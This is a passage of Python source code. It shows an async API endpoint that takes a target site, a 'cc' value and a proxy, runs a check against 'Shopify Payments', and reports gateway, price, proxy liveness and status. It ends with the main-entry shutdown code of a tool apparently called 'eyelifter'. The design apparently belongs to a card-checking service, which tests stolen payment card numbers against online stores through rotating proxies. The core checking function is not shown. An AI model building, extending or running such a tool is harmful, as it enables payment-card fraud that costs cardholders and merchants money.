        return _JSONResponse({"error": "unauthorized"}, status_code=401)

    if not site or not cc:
        return _JSONResponse(
            {
                "Gateway":  "Shopify Payments",
                "Price":    "0.00",
                "Proxy":    "Live",
                "Response": "INVALID_REQUEST",
                "Status":   False,
            },
            status_code=200,
        )

    clean_proxy = _sanitize_proxy_url(proxy)
    if proxy and not clean_proxy:
        _log.warning(f"[SHOPIFY] rejecting malformed proxy for {site}")
        return _JSONResponse(
            {
                "Gateway":  "Shopify Payments",
                "Price":    "0.00",
                "Proxy":    "Dead",
                "Response": "INVALID_PROXY_FORMAT",
                "Status":   False,
            },
            status_code=200,
        )

    # Fix H: saturation guard.
    global _INFLIGHT
    with _INFLIGHT_LOCK:
        if _INFLIGHT >= MAX_INFLIGHT:
            saturated = True
        else:
            saturated = False
            _INFLIGHT += 1
    if saturated:
        _log.warning(f"[SHOPIFY] saturated (inflight≥{MAX_INFLIGHT}) — 503 for {site}")
        return _JSONResponse(
            {
                "Gateway":  "Shopify Payments",
                "Price":    "0.00",
                "Proxy":    "Live",
                "Response": "SERVER_BUSY",
                "Status":   False,
            },
            status_code=503,
        )

    loop = _asyncio.get_running_loop()
    try:
        result = await _asyncio.wait_for(
            loop.run_in_executor(EXEC, _run_sync, site, cc, clean_proxy),
            timeout=REQ_TIMEOUT,
        )
    except _asyncio.TimeoutError:
        _log.warning(f"[SHOPIFY] hard timeout {REQ_TIMEOUT}s for {site}")
        return _JSONResponse(
            {
                "Gateway":  "Shopify Payments",
                "Price":    "0.00",
                "Proxy":    "Dead",
                "Response": "API_TIMEOUT",
                "Status":   False,
            },
            status_code=200,
        )
    except _asyncio.CancelledError:
        raise
    except Exception as e:
        _log.exception(f"[SHOPIFY] unexpected error for {site}")
        return _JSONResponse(
            {
                "Gateway":  "Shopify Payments",
                "Price":    "0.00",
                "Proxy":    "Dead",
                "Response": f"API_ERROR: {type(e).__name__}: {str(e)[:60]}",
                "Status":   False,
            },
            status_code=200,
        )
    finally:
        with _INFLIGHT_LOCK:
            if _INFLIGHT > 0:
                _INFLIGHT -= 1

    # Fix J: derive log level from Status / [SEVERITY] prefix in Response.
    lvl, resp_clean = _log_level_from_response(result.get("Response", ""), result["Status"])
    _log.log(
        lvl,
        f"[SHOPIFY] site={site} status={result['Status']} "
        f"resp={resp_clean[:40]} proxy={result['Proxy']}"
    )
    return _JSONResponse(result)


if __name__ == "__main__":
    _exit_code = 0
    try:
        eyelifter_main()
    except SystemExit:
        raise
    except KeyboardInterrupt:
        eyelifter_STOP.set()
        print("\ninterrupted — exiting clean")
        _exit_code = 130
    except RuntimeError as _exc:
        print(f"\n[!] {_exc}")
        _exit_code = 1
    except BaseException as _exc:
        import traceback
        traceback.print_exc()
        print(f"\n[FATAL] {type(_exc).__name__}: {_exc}")
        _exit_code = 1
    finally:
        try:
            eyelifter_stop_writer()
        except Exception:
            pass
        try:
            sys.stdout.flush()
        except Exception:
            pass
        try:
            import concurrent.futures.thread as _cft
            _cft._threads_queues.clear()
        except Exception:
            pass
        time.sleep(0.15)
        os._exit(_exit_code)
